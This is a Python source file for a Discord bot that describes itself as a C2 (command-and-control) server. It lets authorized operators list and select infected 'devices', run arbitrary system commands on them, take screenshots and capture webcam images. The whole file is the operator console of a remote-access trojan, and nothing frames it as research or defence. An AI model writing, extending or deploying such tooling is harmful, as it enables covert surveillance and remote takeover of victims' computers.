import discord
from discord.ext import commands
import os
import asyncio

# --- Configuration ---
TOKEN_PATH = 'token.txt'
AUTHORIZED_USERS = [1153459521251983470]
SERVER_CATEGORY_NAME = "🔴 Live Sessions"
COMMAND_PREFIX = "!c2"

# --- State Management ---
# This dictionary will store the operator's currently selected device channel.
# Format: { operator_user_id: discord.TextChannel }
active_sessions = {}

# --- Bot Setup ---
intents = discord.Intents.default()
bot = commands.Bot(command_prefix='/', intents=intents, help_command=None)

def load_token() -> str:
    if not os.path.exists(TOKEN_PATH):
        raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
    with open(TOKEN_PATH, 'r') as f:
        return f.read().strip()

# --- New C2 Management Commands ---

@bot.tree.command(name="list_devices", description="Lists all currently active devices.")
async def list_devices(interaction: discord.Interaction):
    if interaction.user.id not in AUTHORIZED_USERS:
        return await interaction.response.send_message("⛔ Unauthorized.", ephemeral=True)
        
    category = discord.utils.get(interaction.guild.categories, name=SERVER_CATEGORY_NAME)
    if not category:
        return await interaction.response.send_message("❌ Category '🔴 Live Sessions' not found.", ephemeral=True)
    
    online_devices = [f"📁 `{channel.name}`" for channel in category.text_channels]
    
    if not online_devices:
        await interaction.response.send_message("No active devices found.", ephemeral=True)
        return

    embed = discord.Embed(title="Active Devices", description="\n".join(online_devices), color=discord.Color.green())
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="select", description="Select a device to issue commands to.")
async def select(interaction: discord.Interaction, device_name: str):
    if interaction.user.id not in AUTHORIZED_USERS:
        return await interaction.response.send_message("⛔ Unauthorized.", ephemeral=True)

    channel = discord.utils.get(interaction.guild.text_channels, name=device_name.lower())
    if not channel:
        return await interaction.response.send_message(f"❌ Device '{device_name}' not found.", ephemeral=True)
    
    active_sessions[interaction.user.id] = channel
    await interaction.response.send_message(f"✅ Session started. You are now controlling **{device_name}**.", ephemeral=True)

# --- Core Commands (Now act as Dispatchers) ---

@bot.tree.command(name="runcmd", description="Execute a system command on the selected device.")
async def runcmd(interaction: discord.Interaction, command: str):
    user_id = interaction.user.id
    if user_id not in AUTHORIZED_USERS:
        return await interaction.response.send_message("⛔ Unauthorized.", ephemeral=True)
    if user_id not in active_sessions:
        return await interaction.response.send_message("⚠️ No device selected. Use `/select <device_name>` first.", ephemeral=True)

    await interaction.response.defer(ephemeral=True, thinking=True)
    
    channel = active_sessions[user_id]
    await channel.send(f"{COMMAND_PREFIX} runcmd {command}")

    await interaction.followup.send(f"✅ Command `{command}` dispatched to **{channel.name}**. Check the channel for output.")

@bot.tree.command(name="takescreenshot", description="Takes a screenshot of the selected device.")
async def takescreenshot(interaction: discord.Interaction):
    user_id = interaction.user.id
    if user_id not in AUTHORIZED_USERS:
        return await interaction.response.send_message("⛔ Unauthorized.", ephemeral=True)
    if user_id not in active_sessions:
        return await interaction.response.send_message("⚠️ No device selected. Use `/select <device_name>` first.", ephemeral=True)

    await interaction.response.defer(ephemeral=True, thinking=True)
    
    channel = active_sessions[user_id]
    await channel.send(f"{COMMAND_PREFIX} takescreenshot")

    await interaction.followup.send(f"✅ Screenshot request sent to **{channel.name}**. Check the channel for the image.")

@bot.tree.command(name="irlpicture", description="Captures a webcam image from the selected device.")
async def irlpicture(interaction: discord.Interaction):
    user_id = interaction.user.id
    if user_id not in AUTHORIZED_USERS:
        return await interaction.response.send_message("⛔ Unauthorized.", ephemeral=True)
    if user_id not in active_sessions:
        return await interaction.response.send_message("⚠️ No device selected. Use `/select <device_name>` first.", ephemeral=True)

    await interaction.response.defer(ephemeral=True, thinking=True)
    
    channel = active_sessions[user_id]
    await channel.send(f"{COMMAND_PREFIX} irlpicture")

    await interaction.followup.send(f"✅ Webcam capture request sent to **{channel.name}**. Check the channel for the image.")


# --- Bot Lifecycle ---
@bot.event
async def on_ready():
    print(f'C2 Bot logged in as {bot.user}')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)
    print('------')

if __name__ == "__main__":
    bot.run(load_token())